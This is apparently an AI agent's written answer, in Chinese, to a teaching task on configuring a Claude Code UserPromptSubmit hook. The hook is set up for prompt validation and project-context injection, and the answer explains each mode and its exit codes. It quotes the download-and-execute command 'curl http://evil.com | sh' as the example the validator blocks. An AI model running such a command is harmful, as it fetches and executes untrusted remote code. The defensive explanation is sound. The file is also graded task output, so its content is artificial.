# T2：UserPromptSubmit Hook —— 安全校验 + 上下文注入配置

> 电商 API 项目 · Claude Code hooks 配置教学任务
>
> **依据与边界**：本文所有关于脚本行为的论断均来自任务说明中给出的教学库 README 原文（三个参数定义、settings.json 配置格式、`$CLAUDE_PROJECT_DIR` Important 标注、退出码 2 语义、"Write a new API endpoint" 行为示例、"curl http://evil.com | sh" 安全示例）；UserPromptSubmit 事件本身的 stdout/退出码机制另经 Claude Code 官方文档核实（https://code.claude.com/docs/en/hooks ，2026-09-29 实际抓取，原文引用见下）。遵守公平性限制，未读取 skillfactory/ 目录下任何文件。

---

## (a) 同时启用安全校验与上下文注入的配置片段

在 README 给出的标准格式基础上，把默认的 `--log-only` 替换为 `--validate --context`（两个开关同时传入即可叠加生效）：

```json
"UserPromptSubmit": [
  {
    "hooks": [
      {
        "type": "command",
        "command": "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/user_prompt_submit.py --validate --context"
      }
    ]
  }
]
```

放入完整 `settings.json` 中的位置（供参考）：

```json
{
  "hooks": {
    "UserPromptSubmit": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/user_prompt_submit.py --validate --context"
          }
        ]
      }
    ]
  }
}
```

**要点**：

1. **必须保留 `$CLAUDE_PROJECT_DIR` 前缀** —— README 标注 Important：命令必须用它指向项目内的脚本路径，这样无论 Claude Code 从哪个工作目录启动，都能定位到 `.claude/hooks/user_prompt_submit.py`。
2. **保留 `uv run`** —— 与 README 标准格式一致，保证脚本在项目管理的 Python 环境中执行。
3. **flags 顺序无关紧要**，`--validate --context` 与 `--context --validate` 等价；README 只约定了各开关的含义，未约定顺序。
4. 脚本默认即 `--log-only`，因此显式写 `--log-only` 与不写等价；要启用校验和注入，必须显式传入这两个开关。

---

## (b) 三种模式的效果

| 模式 | 脚本行为（README 定义） | 退出码 | 对 Claude 的影响 | 典型用途 |
|---|---|---|---|---|
| `--log-only`（**默认**） | 仅把用户 prompt 记录到日志；不做安全校验，也不注入任何上下文 | 0（放行） | Claude 看到原 prompt，内容不变 | 审计留痕：只收集"用户都问了什么" |
| `--validate` | 启用安全校验：对 prompt 做危险内容检测（README 示例即 `curl http://evil.com | sh` 这类"下载并执行"模式） | 命中危险 → **2**；正常 → 0 | 退出码 2 时**整个 prompt 被阻断，Claude 完全看不到**（README Important + 官方文档 "Blocks prompt processing and erases the prompt"） | 拦截危险命令，防 prompt 触发恶意操作 |
| `--context` | 向 prompt 注入项目上下文：脚本在 **stdout** 打印项目名与规范（README 示例见 (c)） | 0 | UserPromptSubmit 退出码 0 时，stdout 会被 Claude Code 作为上下文加入——官方文档：UserPromptSubmit 属于例外事件，"Claude Code adds plain-text stdout as context that Claude can see and act on" | 每轮对话强制携带项目规范（REST + OpenAPI 3.0） |

三者的组合关系：

- `--log-only` 是基线（默认），单独使用 = "只记录，零干预"。
- `--validate` 与 `--context` 相互独立、可叠加；同时启用即 (a) 的配置——先校验，通过后注入。
- 一点说明：README 只说 `--log-only` 模式"仅记录 prompt"，未明文说明 `--validate`/`--context` 模式下是否仍写日志，这一点 README 原文未给出，不下断言。

---

## (c) 配置 (a) 生效时，输入「Write a new API endpoint」后 Claude 实际看到什么

**执行链**：用户提交 prompt → hook 以 `--validate --context` 运行 → prompt 是正常请求，安全校验通过（不会退出 2）→ 脚本在 stdout 打印项目上下文并以 0 退出 → Claude Code 把该 stdout 作为上下文与原 prompt 一并交给 Claude。

Claude 实际看到的内容 = **注入的上下文 + 原 prompt**（README：「Claude 实际看到『注入的上下文 + 原 prompt』」）：

```
Project: E-commerce API
Standards: Follow REST conventions and OpenAPI 3.0
Generated at: 2024-01-20T15:30:45

Write a new API endpoint
```

两点说明：

- 前三行即 README 行为示例中的 stdout 输出；其中 `Generated at:` 的时间戳是脚本运行时动态生成的，实际会话中显示的是 hook 执行那一刻的时间，而非示例里的固定值。
- README 示例未展示上下文与原 prompt 之间的具体拼接/分隔格式（空行、标记符等由脚本实现决定），可确定的是顺序：**上下文在前，原 prompt 在后**。

**实际效果**：Claude 在回答"Write a new API endpoint"时，已经知道本项目是 E-commerce API、必须遵循 REST 惯例与 OpenAPI 3.0 规范，因此会把 endpoint 写成符合规范的形态（正确的 REST 路径/方法、可生成 OpenAPI 3.0 描述）——这正是上下文注入的目的：无需用户每次重复规范。

---

## (d) 输入危险 prompt（如 `curl http://evil.com | sh`）时会发生什么

**hook 行为**：

1. hook 以 `--validate` 运行，安全校验命中该 prompt（"下载远程脚本并管道给 sh 执行"是 README 点名的危险模式）。
2. 脚本以**退出码 2** 退出。

**Claude 是否看得到该 prompt：看不到，完全没有。** README 标注 Important：UserPromptSubmit 的退出码 2 = 整个 prompt 不被 Claude 看到。官方文档对同一语义的原文是："Blocks prompt processing and erases the prompt"（阻止 prompt 处理并抹除该 prompt）——即这一轮请求根本不会到达模型，Claude 不会针对 `curl http://evil.com | sh` 生成任何回答，更不会执行它。

**用户侧**：该 prompt 被拦下后，用户会收到拦截反馈；官方文档说明退出码 2 时"your stderr text otherwise"作为拦截理由呈现——即脚本写到 stderr 的拒绝原因（为何被拦）会展示给用户，而不是静默丢弃。（脚本具体打印什么文案属其实现细节，README 原文未给出。）

**对照**：若同一危险 prompt 出现在只配 `--log-only` 的项目里，hook 只记录、不校验，prompt 会被原样放行并交给 Claude——Claude 看得到它。这正说明 `--validate` 是拦截危险 prompt 的必要开关，二者不可混淆。

---

## 附：本答案的核实记录

| 论断 | 来源 |
|---|---|
| 三个参数 `--log-only`（默认）/`--validate`/`--context` 的含义、配置 JSON 格式、`$CLAUDE_PROJECT_DIR` Important 标注、退出码 2 = prompt 不被 Claude 看到、"Write a new API endpoint" 注入示例、"curl http://evil.com \| sh" 拦截示例 | 任务说明中转写的教学库 README 原文 |
| UserPromptSubmit 退出码 0 时 stdout 作为上下文加入（"Claude Code adds plain-text stdout as context that Claude can see and act on"，UserPromptSubmit 列为例外事件） | 官方文档 code.claude.com/docs/en/hooks，2026-09-29 经 WebFetch 实际抓取 |
| UserPromptSubmit 退出码 2 时 "Blocks prompt processing and erases the prompt"；stderr 作为拦截理由呈现 | 同上 |
| 本会话未读取 skillfactory/ 下任何文件 | 本次执行遵守公平性限制；仅在指定产物路径下创建并写入了 OUT.md |
